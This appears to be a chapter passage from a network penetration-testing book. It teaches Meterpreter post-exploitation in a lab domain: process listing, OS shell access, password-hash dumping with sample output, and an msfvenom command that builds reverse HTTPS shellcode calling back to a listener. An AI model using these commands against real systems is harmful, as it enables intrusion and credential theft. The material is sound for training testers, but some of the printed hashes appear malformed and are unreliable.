### Meterpreter Command Reference

| Command                   | Description                                          |
|---------------------------|------------------------------------------------------|
| `?`                        | Displays the help menu.                              |
| `background`               | Sends the current session to the background.          |
| `bg`                       | Alias for `background`.                              |
| `bgkill`                   | Terminates a background Meterpreter script.          |
| `bglist`                   | Lists all running background scripts.                 |
| `bgrun`                    | Executes a Meterpreter script in the background.      |
| `channel`                  | Displays information or controls active channels.    |
| `close`                    | Closes a channel.                                    |
| `detach`                   | Detaches the Meterpreter session.                     |
| `disable_unicode_encoding` | Disables encoding of Unicode strings.                 |
| `enable_unicode_encoding`  | Enables encoding of Unicode strings.                  |
| `exit`                     | Terminates the Meterpreter session.                   |
| `get_timeouts`             | Retrieves the current session timeout values.         |
| `guid`                     | Displays the session GUID.                            |
| `help`                     | Displays the help menu.                               |
| `info`                     | Provides information about a Post module.             |
| `irb`                      | Opens an interactive Ruby shell on the current session.|

**Listing 7.5: The Meterpreter Help Screen**

### Privilege Escalation and Timestomp Commands

#### Password Database Commands
| Command       | Description                                         |
|---------------|-----------------------------------------------------|
| `hashdump`    | Dumps the contents of the SAM database.              |

#### Timestomp Commands
| Command       | Description                                         |
|---------------|-----------------------------------------------------|
| `timestomp`   | Manipulates file MACE (Modification, Access, Creation, Entry) attributes. |

---

### Exploring the Meterpreter Shell

While it's not necessary to learn all the features of the Meterpreter shell, two excellent resources can help you dive deeper:
1. **Metasploit Unleashed Documentation**: Detailed documentation from Offensive Security.
   - [Link](http://mng.bz/emKQ)
2. **Metasploit: The Penetration Tester’s Guide**: Specifically, Chapter 6, "Meterpreter" by David Kennedy, Jim O’Gorman, Devon Kearns, and Mati Aharoni (No Starch Press, 2011).

### Useful Meterpreter Commands

Once you have a Meterpreter shell, some initial steps include identifying running applications, system usage, and active users. The `ps` command is particularly useful for this purpose, similar to the Linux/UNIX `ps` command.

```plaintext
meterpreter > ps
Process List
============
 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 0     0     [System Process]                                                       
 4     0     System                  x64   0                                       
 252   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 272   460   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\spoolsv.exe
 2104  332   rdpclip.exe             x64   2        CAPSULECORP\tien             C:\Windows\system32\rdpclip.exe
 2416  1144  userinit.exe            x64   2        CAPSULECORP\tien             C:\Windows\system32\userinit.exe
 2428  848   dwm.exe                 x64   2        CAPSULECORP\tien             C:\Windows\system32\Dwm.exe
 2452  2416  explorer.exe            x64   2        CAPSULECORP\tien             C:\Windows\Explorer.EXE
 2624  2452  tvnserver.exe           x64   2        CAPSULECORP\tien             C:\Program Files\TightVNC\tvnserver.exe
 2696  784   audiodg.exe             x64   0                                       
 2844  1012  SearchProtocolHost.exe  x64   2        CAPSULECORP\tien             C:\Windows\system32\SearchProtocolHost.exe
 2864  1012  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchFilterHost.exe
```

From the output, you can see that mostly default Windows processes are running, with the exception of a TightVNC server (PID 2624) and an Active Directory user named `tien` logged in via RDP (PID 2104). This suggests that the user account `CAPSULECORP\tien` is logged in remotely, and you may be able to obtain their credentials.

### Executing OS Commands

To execute OS commands via Meterpreter, use the `shell` command. This will drop you into an OS command prompt. You can then exit back to the Meterpreter shell using `exit`.

```plaintext
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>exit
exit
meterpreter >
```

### Using Post Modules

Post modules are Metasploit modules used after obtaining a Meterpreter shell. For example, to dump password hashes, you can use the `smart_hashdump` post module.

```plaintext
meterpreter > run post/windows/gather/smart_hashdump
[*] Running module against TIEN 
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /~/.msf4/loot21522_default_10.0.10.208windows.hashes_755293.txt 
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 5a7039b3d33a1e2003c19df086ccea8d
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...
[+] tien:"Bookstack"                   
[*] Dumping password hashes...
[+]
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59de0c089c0:::
[+]
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:6769dd01f1f8b61924785de2d467a41:::
meterpreter >
```

### Cautions About Public Exploit Databases

The public exploit database, such as [exploit-db.com](https://www.exploit-db.com/), contains many proof-of-concept exploits. However, these exploits vary in quality and reliability. Be cautious when using them, and always review the source code. If you must use an exploit, ensure you understand how to replace the shellcode with your own.

### Generating Custom Shellcode

You can generate custom shellcode using `msfvenom`. For example, to create shellcode for a reverse HTTPS payload:

```bash
./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.10.160 LPORT=443 --platform Windows -f python
```

This will generate Python-compatible shellcode that connects back to `10.0.10.160` on port `443`.

### Summary

- **Exploits** are programs that take advantage of unpatched software bugs.
- **Enterprise networks** often fail to patch all systems, making them vulnerable.
- **MS17-010 (EternalBlue)** is a well-known vulnerability that is easy to exploit.
- **Meterpreter** is a powerful payload with additional functionality like post modules.
- **Public exploit databases** can be risky; always generate and verify your own shellcode.

### Next Steps

In the next chapter, we will cover post-exploitation techniques, including maintaining persistent access, harvesting credentials, and moving laterally within the network.